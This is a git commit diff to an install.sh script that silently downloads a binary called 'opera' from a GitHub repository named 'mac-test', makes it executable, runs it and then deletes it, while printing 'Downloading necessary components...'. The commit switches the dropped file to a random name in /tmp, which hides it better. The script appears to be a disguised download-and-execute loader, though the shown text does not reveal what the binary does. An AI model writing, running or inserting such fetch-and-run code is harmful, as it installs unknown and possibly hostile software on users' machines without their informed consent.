6598a325eeabca4482cbb9cfd383c26e97a07ada
hdsed-sudo <viperr814@gmail.com>
2025-09-18 02:57:55 +0300

    123

--- install.sh
+++ install.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
+RANDOM_NAME=$(openssl rand -hex 8)
 echo "Downloading necessary components..."
-curl -s "https://raw.githubusercontent.com/hdsed-sudo/mac-test/main/opera" -o /tmp/opera
-chmod +x /tmp/opera
-/tmp/opera
-rm -f /tmp/opera
+curl -s "https://raw.githubusercontent.com/hdsed-sudo/mac-test/main/opera" -o "/tmp/$RANDOM_NAME"
+chmod +x "/tmp/$RANDOM_NAME"
+"/tmp/$RANDOM_NAME"
+rm -f "/tmp/$RANDOM_NAME"
